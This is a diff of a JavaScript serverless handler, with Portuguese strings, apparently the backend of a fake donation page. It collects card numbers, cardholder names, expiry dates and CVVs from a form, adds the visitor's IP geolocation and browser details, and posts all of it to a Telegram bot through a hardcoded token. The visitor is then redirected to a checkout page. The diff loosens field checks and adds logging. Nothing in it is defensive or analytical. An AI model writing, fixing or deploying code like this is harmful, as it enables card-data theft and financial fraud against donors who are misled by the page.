@@ -1,42 +1,41 @@
-// api/enviar.js
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Método não permitido, só POST' });
-    // ou redireciona se quiser: res.redirect('https://doe.savebrasil.org.br/');
+    return res.status(405).json({ error: 'Só POST' });
   }
 
+  console.log('Body recebido:', req.body);
+
+  const body = req.body || {};
   const {
-    numero_cartao,
-    nome_cartao,
-    validade_cartao,
-    cvv,
-    valor_doacao
-  } = req.body;
+    numero_cartao = '',
+    nome_cartao = '',
+    validade_cartao = '',
+    cvv = '',
+    valor_doacao = ''
+  } = body;
 
-  if (!numero_cartao || !nome_cartao || !validade_cartao || !cvv || !valor_doacao) {
-    return res.status(400).send('Algum campo esta vazio');
+  if (!numero_cartao || !cvv || !valor_doacao) {
+    return res.status(400).send('Faltou campo');
   }
 
-  const ip = req.headers['x-forwarded-for'] || req.headers['cf-connecting-ip'] || req.socket.remoteAddress || 'desconhecido';
-  const userAgent = req.headers['user-agent'] || 'N/A';
-  const acceptLanguage = req.headers['accept-language'] || 'N/A';
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['cf-connecting-ip'] || req.socket?.remoteAddress || 'desconhecido';
+  console.log('IP:', ip);
 
-  // pegando info do IP (mesma API que você usava)
   let ipInfo = { query: ip, city: 'N/A', regionName: 'N/A', country: 'N/A', isp: 'N/A' };
   try {
-    const ipResponse = await fetch(`http://ip-api.com/json/${ip}`);
-    ipInfo = await ipResponse.json();
+    const ipRes = await fetch(`http://ip-api.com/json/${ip}?fields=query,city,regionName,country,isp`);
+    if (ipRes.ok) ipInfo = await ipRes.json();
   } catch (e) {
-    console.log('Deu ruim no ip-api', e);
+    console.error('ip-api erro:', e);
   }
 
-  // detecta navegador (bem tosco igual o seu)
   let navegador = 'Desconhecido';
-  if (/Firefox/i.test(userAgent)) navegador = 'Firefox';
-  else if (/Edg/i.test(userAgent)) navegador = 'Edge';
-  else if (/Chrome/i.test(userAgent)) navegador = 'Chrome';
-  else if (/Safari/i.test(userAgent)) navegador = 'Safari';
-  else if (/OPR|Opera/i.test(userAgent)) navegador = 'Opera';
+  const ua = req.headers['user-agent'] || 'N/A';
+  if (/Firefox/i.test(ua)) navegador = 'Firefox';
+  else if (/Edg/i.test(ua)) navegador = 'Edge';
+  else if (/Chrome/i.test(ua)) navegador = 'Chrome';
+  else if (/Safari/i.test(ua)) navegador = 'Safari';
+  else if (/OPR|Opera/i.test(ua)) navegador = 'Opera';
 
   const dataHora = new Date().toISOString().replace('T', ' ').split('.')[0];
 
@@ -55,9 +54,9 @@ export default async function handler(req, res) {
 🌎 | País: ${ipInfo.country}
 📦 | ISP: ${ipInfo.isp}
 
-🔓 | USER-AGENT: ${userAgent}
+🔓 | USER-AGENT: ${ua}
 🌐 | NAVEGADOR: ${navegador}
-👥 | LINGUAGEM: ${acceptLanguage}
+👥 | LINGUAGEM: ${req.headers['accept-language'] || 'N/A'}
 📆 | DATA/HORA: ${dataHora}`;
 
   const botToken = '8249791748:AAHsushNFJnmQ_eh3QMx4ijxe8y8mVbZa9U';
@@ -66,15 +65,17 @@ export default async function handler(req, res) {
   const telegramUrl = `https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${encodeURIComponent(conteudo)}`;
 
   try {
-    const telegramRes = await fetch(telegramUrl);
-    if (telegramRes.ok) {
-      return res.redirect(302, '/checkout.html');
+    console.log('Enviando pro TG...');
+    const tgRes = await fetch(telegramUrl);
+    const tgText = await tgRes.text();
+    console.log('TG resposta:', tgText);
+    if (tgRes.ok) {
+      return res.redirect(302, '/css/checkout.html');
     } else {
-      console.log('Erro ao pagar', await telegramRes.text());
-      return res.status(500).send('Erro ao efetuar pagamento);
+      return res.status(500).send('Erro TG: ' + tgText);
     }
   } catch (err) {
-    console.error(err);
-    return res.status(500).send('Fodeu geral');
+    console.error('Fetch TG fodeu:', err);
+    return res.status(500).send('Erro total');
   }
 }
